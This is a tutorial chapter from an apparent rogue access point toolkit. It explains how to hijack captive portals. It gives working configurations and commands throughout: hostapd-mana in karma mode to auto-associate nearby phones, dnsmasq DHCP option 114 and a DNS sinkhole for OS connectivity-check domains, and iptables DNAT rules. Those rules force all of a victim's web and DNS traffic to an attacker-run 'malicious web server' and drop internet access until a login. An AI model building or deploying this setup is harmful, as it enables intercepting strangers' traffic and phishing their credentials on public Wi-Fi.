# 02. Network & iptables Mastery

Captive Portal hijacking relies entirely on precise manipulation of the Linux kernel's routing tables and the DNS stack. This document dissects the core scripts: `captive-portal.sh` (from BITB) and `start.sh` (from Captive-Autoredirect).

---

## 1. The Access Point: `hostapd-mana`
We use `hostapd-mana` instead of the standard `hostapd`.
* **The Configuration (`hostapd.conf` generation):**
  ```ini
  interface=wlan1
  ssid=Free Public WiFi
  hw_mode=g
  channel=6
  enable_mana=1
  mana_loud=1
  ```
* **Why MANA?** MANA enables the `--karma` attack vector. Normal access points only respond to their specific SSID. MANA listens to the victim's smartphone screaming *"Is Starbucks WiFi here?"* and forcefully responds *"Yes, I am Starbucks WiFi!"* automatically associating the client without user interaction.

---

## 2. DNS & DHCP Spoofing (`dnsmasq`)

Once associated, the victim device asks for an IP (DHCP) and a domain resolver (DNS).

### The DHCP Captive Portal API Trick
Inside `captive-portal.sh`, look at the `dnsmasq.conf` generation:
```ini
dhcp-option=114,"http://${AP_IP}/__connect"
dhcp-option=160,"http://${AP_IP}/__connect"
```
**Explanation:** 
Historically, OSes detect captive portals by attempting to hit `http://captive.apple.com`. If intercepted, they open the popup. However, modern OSes (iOS 14+, Android 11+) support **RFC 7710 (Captive-Portal Identification in DHCP)**. By broadcasting Option 114, we explicitly tell the OS *"You are trapped in a captive portal, the login page is exactly at this URL."* This forces the OS to open the popup much faster and more reliably than relying solely on DNS hijacking.

### The DNS Sinkhole
```ini
address=/connectivitycheck.gstatic.com/${AP_IP}
address=/connectivitycheck.android.com/${AP_IP}
address=/clients3.google.com/${AP_IP}
address=/captive.apple.com/${AP_IP}
address=/www.msftconnecttest.com/${AP_IP}
```
**Explanation:**
When the OS ignores DHCP Option 114, it falls back to DNS probes. It will try to resolve `captive.apple.com`. Our `dnsmasq` intercepts this query and returns our Rogue AP's IP (`10.99.0.1`), ensuring the HTTP request hits our malicious web server.

---

## 3. Kernel Routing: The `iptables` Magic

This is where developers get the most confused. Let's break down the `iptables` rules line-by-line.

### Flushing and Setting up Chains
```bash
iptables -t nat -F
iptables -t nat -X
iptables -t nat -N bitb_nat
iptables -t nat -A PREROUTING -j bitb_nat
```
We create a custom chain (`bitb_nat`) and hook it into `PREROUTING`. `PREROUTING` intercepts packets *before* the Linux kernel decides where they should go.

### The Core DNAT Rules (Destination NAT)
```bash
iptables -t nat -A bitb_nat -p tcp --dport 80  -j DNAT --to-destination "${AP_IP}:${BITB_PORT}"
iptables -t nat -A bitb_nat -p tcp --dport 443 -j DNAT --to-destination "${AP_IP}:${BITB_HTTPS_PORT}"
```
**Line-by-line Translation:**
"If any TCP packet comes in aimed at port 80 (HTTP) or 443 (HTTPS), immediately rewrite its destination IP to our Rogue AP IP, and change its port to `8080` (where our PHP/Node payload is listening)."
* **Why DNAT over REDIRECT?** `REDIRECT` only works if the packet is destined for the local machine loopback. `DNAT` forcefully rewrites the packet header, making it far more reliable for external AP interfaces (`wlan1`).

### The DNS Intercept Rule
```bash
iptables -t nat -A bitb_nat -p udp --dport 53 -j DNAT --to-destination "${AP_IP}:53"
```
**Explanation:**
Some victims use hardcoded custom DNS (like `8.8.8.8` configured in their Wi-Fi settings). If they do this, they will bypass our `dnsmasq` server. This `iptables` rule intercepts *all* traffic heading to port 53 (anywhere in the world) and forces it back to our local `dnsmasq`. This ensures our DNS sinkhole cannot be bypassed.

### The "Internet Drop"
```bash
iptables -A FORWARD -i ${WIFI_IFACE} -j DROP
```
Unless explicitly allowed (which happens *after* a successful login via the whitelist script), we drop all packets attempting to route to the actual internet. This simulates a strict "Pay to Access" gateway.
